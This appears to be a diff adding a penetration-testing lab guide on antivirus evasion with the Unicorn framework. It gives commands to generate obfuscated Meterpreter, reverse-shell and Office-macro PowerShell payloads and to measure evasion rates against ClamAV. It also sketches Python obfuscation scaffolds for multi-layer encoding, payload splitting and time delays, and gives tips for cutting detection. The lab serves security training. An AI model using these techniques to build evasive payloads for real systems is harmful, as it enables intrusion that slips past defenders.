@@ -1,0 +1,610 @@
+Perform Antivirus Evasion with Unicorn
+Objectives
+By the end of this lab, students will be able to:
+
+Install and configure the Unicorn framework for payload generation
+Generate obfuscated PowerShell payloads using various techniques
+Test payload detection rates against antivirus software
+Automate payload generation and testing with Python scripts
+Analyze evasion effectiveness and detection patterns
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of PowerShell and Linux command-line operations
+Familiarity with penetration testing concepts and Metasploit framework
+Basic Python programming skills
+Lab Environment
+Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Simply click Start Lab to access your pre-configured environment with all necessary tools installed.
+
+Task 1: Install and Configure Unicorn Framework
+Step 1.1: Clone and Setup Unicorn
+Install the Unicorn framework on your Linux machine:
+
+# Update system and install dependencies
+sudo apt update && sudo apt install -y git python3 python3-pip metasploit-framework
+
+# Clone Unicorn repository
+cd /opt
+sudo git clone https://github.com/trustedsec/unicorn.git
+sudo chown -R $USER:$USER /opt/unicorn
+
+# Navigate and verify installation
+cd /opt/unicorn
+chmod +x unicorn.py
+python3 unicorn.py --help
+Step 1.2: Explore Unicorn Capabilities
+Review available options and payload types:
+
+# Display help menu
+python3 unicorn.py --help
+
+# View available Metasploit payloads
+msfvenom --list payloads | grep windows
+Key Unicorn Features:
+
+PowerShell attack vectors with automatic obfuscation
+Macro attack vectors for Office documents
+DDE (Dynamic Data Exchange) attack vectors
+Multiple encoding and obfuscation layers
+Step 1.3: Generate Basic Payloads
+Create your first obfuscated payloads:
+
+# Create working directory
+mkdir -p ~/unicorn_lab
+cd ~/unicorn_lab
+
+# Generate basic reverse TCP payload
+python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 127.0.0.1 4444
+
+# Examine the generated payload
+cat powershell_attack.txt | head -20
+
+# Rename for organization
+mv powershell_attack.txt payload_basic.txt
+Step 1.4: Generate Multiple Payload Variants
+Create different payload types for testing:
+
+# Generate reverse HTTPS payload
+python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_https 127.0.0.1 443
+mv powershell_attack.txt payload_https.txt
+
+# Generate shell payload
+python3 /opt/unicorn/unicorn.py windows/shell/reverse_tcp 127.0.0.1 4445
+mv powershell_attack.txt payload_shell.txt
+
+# Generate macro-based payload
+python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 127.0.0.1 4446 macro
+mv powershell_attack.txt payload_macro.txt
+
+# List all generated payloads
+ls -lh payload_*.txt
+Task 2: Test Payloads Against Antivirus Software
+Step 2.1: Install and Configure ClamAV
+Setup local antivirus testing environment:
+
+# Install ClamAV antivirus engine
+sudo apt install -y clamav clamav-daemon
+
+# Update virus definitions
+sudo systemctl stop clamav-freshclam
+sudo freshclam
+sudo systemctl start clamav-freshclam
+
+# Verify ClamAV is working
+clamscan --version
+Step 2.2: Create Baseline Test
+Verify antivirus detection capabilities:
+
+# Create EICAR test file (standard AV test)
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt
+
+# Test detection (should be detected)
+clamscan eicar.txt
+
+# Expected output: eicar.txt: Win.Test.EICAR_HDB-1 FOUND
+Step 2.3: Test Generated Payloads
+Scan your Unicorn-generated payloads:
+
+# Scan individual payloads
+echo "=== Testing Basic Payload ==="
+clamscan payload_basic.txt
+
+echo "=== Testing HTTPS Payload ==="
+clamscan payload_https.txt
+
+echo "=== Testing Shell Payload ==="
+clamscan payload_shell.txt
+
+echo "=== Testing Macro Payload ==="
+clamscan payload_macro.txt
+
+# Scan all payloads at once
+clamscan payload_*.txt --no-summary
+Step 2.4: Create Detection Analysis Script
+Build a simple bash script to analyze results:
+
+cat > detection_test.sh << 'EOF'
+#!/bin/bash
+
+echo "=== Antivirus Detection Analysis ==="
+echo "Date: $(date)"
+echo "===================================="
+
+TOTAL=0
+DETECTED=0
+
+for payload in payload_*.txt; do
+    if [ -f "$payload" ]; then
+        TOTAL=$((TOTAL + 1))
+        echo -n "Testing $payload: "
+        
+        if clamscan --no-summary "$payload" 2>/dev/null | grep -q "FOUND"; then
+            echo "DETECTED"
+            DETECTED=$((DETECTED + 1))
+        else
+            echo "NOT DETECTED"
+        fi
+    fi
+done
+
+EVASION_RATE=$(( (TOTAL - DETECTED) * 100 / TOTAL ))
+
+echo "===================================="
+echo "Total Payloads: $TOTAL"
+echo "Detected: $DETECTED"
+echo "Evaded: $((TOTAL - DETECTED))"
+echo "Evasion Rate: ${EVASION_RATE}%"
+EOF
+
+chmod +x detection_test.sh
+./detection_test.sh
+Task 3: Automate Payload Generation and Testing with Python
+Step 3.1: Create Automated Payload Generator
+Build a Python script to automate the workflow. Students must complete the implementation:
+
+#!/usr/bin/env python3
+"""
+Automated Unicorn Payload Generator and Tester
+Students: Complete the TODO sections to implement full functionality
+"""
+
+import subprocess
+import os
+import json
+from datetime import datetime
+
+class PayloadAutomation:
+    def __init__(self, unicorn_path="/opt/unicorn/unicorn.py"):
+        self.unicorn_path = unicorn_path
+        self.output_dir = "automated_payloads"
+        self.create_output_directory()
+    
+    def create_output_directory(self):
+        """Create output directory if it doesn't exist"""
+        if not os.path.exists(self.output_dir):
+            os.makedirs(self.output_dir)
+    
+    def generate_payload(self, payload_type, lhost, lport, suffix=""):
+        """
+        Generate a single payload using Unicorn
+        
+        Args:
+            payload_type: Metasploit payload type (e.g., windows/meterpreter/reverse_tcp)
+            lhost: Listener host IP address
+            lport: Listener port number
+            suffix: Optional suffix for filename
+        
+        Returns:
+            Path to generated payload file or None if failed
+        """
+        # TODO: Build command list for subprocess
+        # TODO: Execute Unicorn with proper parameters
+        # TODO: Handle the generated powershell_attack.txt file
+        # TODO: Rename file with descriptive name including suffix
+        # TODO: Return the new filename or None on error
+        pass
+    
+    def generate_payload_suite(self):
+        """
+        Generate multiple payload variants for comprehensive testing
+        
+        Returns:
+            List of generated payload file paths
+        """
+        payload_configs = [
+            {"type": "windows/meterpreter/reverse_tcp", "port": 4444, "suffix": "meterpreter_tcp"},
+            {"type": "windows/meterpreter/reverse_https", "port": 443, "suffix": "meterpreter_https"},
+            {"type": "windows/shell/reverse_tcp", "port": 4445, "suffix": "shell_tcp"},
+            {"type": "windows/meterpreter/reverse_http", "port": 8080, "suffix": "meterpreter_http"},
+        ]
+        
+        # TODO: Loop through payload_configs
+        # TODO: Generate each payload using generate_payload()
+        # TODO: Collect successful generations in a list
+        # TODO: Return list of generated files
+        pass
+    
+    def scan_payload(self, filepath):
+        """
+        Scan a payload file with ClamAV
+        
+        Args:
+            filepath: Path to payload file
+        
+        Returns:
+            Dictionary with scan results
+        """
+        # TODO: Execute clamscan command on filepath
+        # TODO: Parse output to determine if detected
+        # TODO: Return dictionary with 'detected' boolean and 'output' string
+        pass
+    
+    def run_full_test(self):
+        """
+        Execute complete payload generation and testing workflow
+        
+        Returns:
+            Dictionary containing test results and statistics
+        """
+        print("=== Starting Automated Testing ===\n")
+        
+        # TODO: Generate payload suite
+        # TODO: Test each payload with scan_payload()
+        # TODO: Collect results and calculate statistics
+        # TODO: Generate summary report
+        # TODO: Save results to JSON file
+        # TODO: Print summary to console
+        pass
+
+def main():
+    """Main execution function"""
+    automation = PayloadAutomation()
+    results = automation.run_full_test()
+    
+    # TODO: Print final summary
+    # TODO: Save detailed report
+
+if __name__ == "__main__":
+    main()
+Save this as payload_automation.py in your working directory.
+
+Step 3.2: Create Advanced Obfuscation Module
+Implement additional evasion techniques. Students complete the core logic:
+
+#!/usr/bin/env python3
+"""
+Advanced Payload Obfuscation Techniques
+Students: Implement the obfuscation methods
+"""
+
+import base64
+import random
+import string
+
+class AdvancedObfuscation:
+    def __init__(self):
+        self.output_dir = "obfuscated_payloads"
+        self.ensure_directory()
+    
+    def ensure_directory(self):
+        """Create output directory"""
+        # TODO: Create directory if it doesn't exist
+        pass
+    
+    def generate_random_variable(self, length=10):
+        """
+        Generate random variable name for obfuscation
+        
+        Args:
+            length: Length of variable name
+        
+        Returns:
+            Random string suitable for variable name
+        """
+        # TODO: Generate random string using letters only
+        # TODO: Ensure first character is a letter
+        pass
+    
+    def multi_layer_encode(self, payload_content):
+        """
+        Apply multiple encoding layers to payload
+        
+        Args:
+            payload_content: Original payload string
+        
+        Returns:
+            Multi-encoded payload string
+        """
+        # TODO: Apply base64 encoding
+        # TODO: Apply hex encoding
+        # TODO: Apply base64 encoding again
+        # TODO: Return final encoded string
+        pass
+    
+    def create_obfuscated_script(self, original_payload):
+        """
+        Create heavily obfuscated PowerShell script
+        
+        Args:
+            original_payload: Original payload content
+        
+        Returns:
+            Obfuscated PowerShell script as string
+        """
+        # TODO: Generate random variable names
+        # TODO: Encode payload using multi_layer_encode()
+        # TODO: Build PowerShell script with decoding logic
+        # TODO: Add junk code for additional obfuscation
+        # TODO: Return complete obfuscated script
+        pass
+    
+    def split_and_concatenate(self, payload_content):
+        """
+        Split payload into chunks and reconstruct at runtime
+        
+        Args:
+            payload_content: Original payload string
+        
+        Returns:
+            PowerShell script that reconstructs payload
+        """
+        # TODO: Split payload into random-sized chunks
+        # TODO: Encode each chunk separately
+        # TODO: Generate random variable names for chunks
+        # TODO: Create script that concatenates chunks
+        # TODO: Return reconstruction script
+        pass
+    
+    def add_time_delay(self, payload_content, delay_seconds=5):
+        """
+        Add time-based execution delay to payload
+        
+        Args:
+            payload_content: Original payload string
+            delay_seconds: Delay before execution
+        
+        Returns:
+            Time-delayed payload script
+        """
+        # TODO: Encode payload
+        # TODO: Add Start-Sleep command
+        # TODO: Add legitimate-looking initialization messages
+        # TODO: Return delayed execution script
+        pass
+    
+    def process_payload_file(self, input_file):
+        """
+        Process a payload file with all obfuscation techniques
+        
+        Args:
+            input_file: Path to original payload file
+        
+        Returns:
+            List of generated obfuscated payload files
+        """
+        # TODO: Read original payload
+        # TODO: Apply each obfuscation technique
+        # TODO: Save each variant to separate file
+        # TODO: Return list of generated files
+        pass
+
+def main():
+    """Main execution"""
+    obfuscator = AdvancedObfuscation()
+    
+    # TODO: Process payload files from previous task
+    # TODO: Test obfuscated payloads
+    # TODO: Compare detection rates
+
+if __name__ == "__main__":
+    main()
+Save this as advanced_obfuscation.py.
+
+Step 3.3: Create Comprehensive Testing Framework
+Build a complete testing and reporting system:
+
+#!/usr/bin/env python3
+"""
+Comprehensive Payload Testing Framework
+Students: Complete the testing and reporting logic
+"""
+
+import os
+import json
+import subprocess
+import hashlib
+from datetime import datetime
+
+class TestingFramework:
+    def __init__(self):
+        self.results_dir = "test_results"
+        self.setup_environment()
+    
+    def setup_environment(self):
+        """Initialize testing environment"""
+        # TODO: Create results directory
+        # TODO: Verify required tools are available
+        pass
+    
+    def calculate_file_hash(self, filepath):
+        """
+        Calculate SHA256 hash of file
+        
+        Args:
+            filepath: Path to file
+        
+        Returns:
+            Dictionary with file hashes
+        """
+        # TODO: Read file in binary mode
+        # TODO: Calculate MD5 hash
+        # TODO: Calculate SHA256 hash
+        # TODO: Return dictionary with both hashes
+        pass
+    
+    def analyze_payload_characteristics(self, filepath):
+        """
+        Analyze payload file characteristics
+        
+        Args:
+            filepath: Path to payload file
+        
+        Returns:
+            Dictionary with payload characteristics
+        """
+        # TODO: Read file content
+        # TODO: Count lines, characters
+        # TODO: Detect encoding indicators (base64, hex, etc.)
+        # TODO: Identify PowerShell commands
+        # TODO: Calculate obfuscation score
+        # TODO: Return analysis dictionary
+        pass
+    
+    def test_with_clamav(self, filepath):
+        """
+        Test payload with ClamAV scanner
+        
+        Args:
+            filepath: Path to payload file
+        
+        Returns:
+            Dictionary with scan results
+        """
+        # TODO: Execute clamscan command
+        # TODO: Parse output for detection
+        # TODO: Return results dictionary
+        pass
+    
+    def run_comprehensive_test(self, payload_directory):
+        """
+        Run comprehensive tests on all payloads in directory
+        
+        Args:
+            payload_directory: Directory containing payload files
+        
+        Returns:
+            Complete test results dictionary
+        """
+        # TODO: Find all payload files in directory
+        # TODO: For each payload:
+        #   - Calculate hashes
+        #   - Analyze characteristics
+        #   - Run AV scans
+        #   - Collect results
+        # TODO: Calculate summary statistics
+        # TODO: Generate report
+        # TODO: Save to JSON file
+        # TODO: Return results
+        pass
+    
+    def generate_report(self, test_results):
+        """
+        Generate formatted test report
+        
+        Args:
+            test_results: Dictionary with test results
+        
+        Returns:
+            Formatted report string
+        """
+        # TODO: Format results as readable report
+        # TODO: Include summary statistics
+        # TODO: List individual payload results
+        # TODO: Add recommendations
+        # TODO: Return formatted string
+        pass
+    
+    def compare_techniques(self, results_list):
+        """
+        Compare effectiveness of different obfuscation techniques
+        
+        Args:
+            results_list: List of test result dictionaries
+        
+        Returns:
+            Comparison analysis dictionary
+        """
+        # TODO: Group results by technique
+        # TODO: Calculate detection rates per technique
+        # TODO: Identify most effective techniques
+        # TODO: Return comparison dictionary
+        pass
+
+def main():
+    """Main execution"""
+    framework = TestingFramework()
+    
+    # TODO: Test payloads from all previous tasks
+    # TODO: Generate comprehensive report
+    # TODO: Display results
+
+if __name__ == "__main__":
+    main()
+Save this as testing_framework.py.
+
+Step 3.4: Execute Complete Testing Workflow
+Run your complete automation suite:
+
+# Generate payloads
+python3 payload_automation.py
+
+# Apply advanced obfuscation
+python3 advanced_obfuscation.py
+
+# Run comprehensive tests
+python3 testing_framework.py
+
+# Review results
+cat test_results/latest_report.json | python3 -m json.tool
+Expected Outcomes
+After completing this lab, you should have:
+
+Multiple obfuscated payload variants generated by Unicorn
+Automated Python scripts for payload generation and testing
+Comprehensive test results showing detection rates
+Understanding of various obfuscation techniques and their effectiveness
+Working knowledge of antivirus evasion methodologies
+Typical Results:
+
+Basic Unicorn payloads: 30-50% evasion rate against ClamAV
+Advanced obfuscated payloads: 60-80% evasion rate
+Multi-layer encoded payloads: 70-90% evasion rate
+Troubleshooting Tips
+Issue: Unicorn fails to generate payloads
+
+Verify Metasploit is properly installed: msfconsole --version
+Check Python version: python3 --version (should be 3.6+)
+Ensure proper permissions on /opt/unicorn directory
+Issue: ClamAV not detecting EICAR test file
+
+Update virus definitions: sudo freshclam
+Restart ClamAV daemon: sudo systemctl restart clamav-daemon
+Verify EICAR string is exact (no line breaks or modifications)
+Issue: Python scripts fail with import errors
+
+Install required packages: pip3 install requests
+Verify Python path: which python3
+Check script permissions: chmod +x script_name.py
+Issue: Payloads detected at high rates
+
+Try additional obfuscation layers in advanced_obfuscation.py
+Implement variable name randomization
+Add more junk code and time delays
+Test with different payload types (HTTPS vs TCP)
+Conclusion
+This lab demonstrated practical antivirus evasion techniques using the Unicorn framework. You learned to generate obfuscated PowerShell payloads, test them against antivirus software, and automate the entire process with Python scripts. Understanding these techniques is crucial for penetration testers to assess organizational security posture and for defenders to recognize evasion attempts.
+
+Key Takeaways:
+
+Obfuscation significantly reduces antivirus detection rates
+Multiple encoding layers provide better evasion
+Automation enables efficient testing of multiple techniques
+No evasion technique is 100% effective
+Ethical use requires proper authorization and scope
+Next Steps:
+
+Explore additional obfuscation frameworks (Veil, Shellter)
+Study behavior-based detection mechanisms
+Research machine learning approaches to evasion detection
+Practice responsible disclosure of findings
+Important Reminder: These techniques should only be used in authorized penetration testing engagements with proper written permission. Unauthorized use is illegal and unethical.
